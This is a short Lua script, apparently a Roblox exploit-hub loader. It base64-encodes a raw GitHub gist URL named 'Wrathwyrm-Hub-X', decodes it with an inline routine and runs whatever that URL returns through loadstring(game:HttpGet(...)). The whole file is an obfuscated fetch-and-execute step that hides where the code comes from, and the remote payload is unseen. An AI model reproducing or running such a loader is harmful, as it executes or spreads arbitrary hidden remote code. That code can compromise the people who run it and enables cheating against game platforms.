local u = ("aHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9qdXN0bW9vbjU2LzBjYzI1YTcxZTRmNjI0NzMyZDQ0MmJhYWI0MmU4NGRmL3Jhdy8yMTBiYjI3N2ZhZmMwOTdiZGM5YzAxYWUyOGMyYTQ5ODNmMTVkNjA3L1dyYXRod3lybS1IdWItWA==")

local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
u=(u:gsub('.',function(x)
if x=='=' then return '' end
local r,f='',(b:find(x)-1)
for i=6,1,-1 do
r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0')
end
return r
end):gsub('%d%d%d?%d?%d?%d?%d?%d?',function(x)
if #x~=8 then return '' end
local c=0
for i=1,8 do
c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0)
end
return string.char(c)
end))

loadstring(game:HttpGet(u))()
